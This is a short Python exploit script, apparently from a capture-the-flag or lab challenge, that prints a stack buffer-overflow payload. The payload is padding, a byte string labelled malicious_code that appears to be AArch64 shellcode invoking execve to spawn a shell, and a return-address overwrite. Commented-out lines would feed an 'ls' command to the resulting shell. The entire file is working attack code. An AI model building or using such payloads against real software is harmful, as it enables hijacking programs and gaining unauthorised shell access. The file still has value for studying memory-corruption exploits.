import os
import sys

malicious_code = b'\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4'
# print(byte(0x70), 0x08)+ascii(0xaa))
sys.stdout.buffer.write(b'\x46\xc1' * (204 - 20))
sys.stdout.buffer.write(malicious_code)
sys.stdout.buffer.write(b'\xb0\xeb\xff\xff\xff\xff\x00\x00')


# sys.stdout.buffer.write('\n'.encode('ascii'))
# sys.stdout.buffer.write('ls'.encode('ascii'))
# sys.stdout.buffer.write('\n'.encode('ascii'))

# sys.stdout.buffer.write(b'\x70\x08\xaa\xaa\xaa\xaa\x00\x00')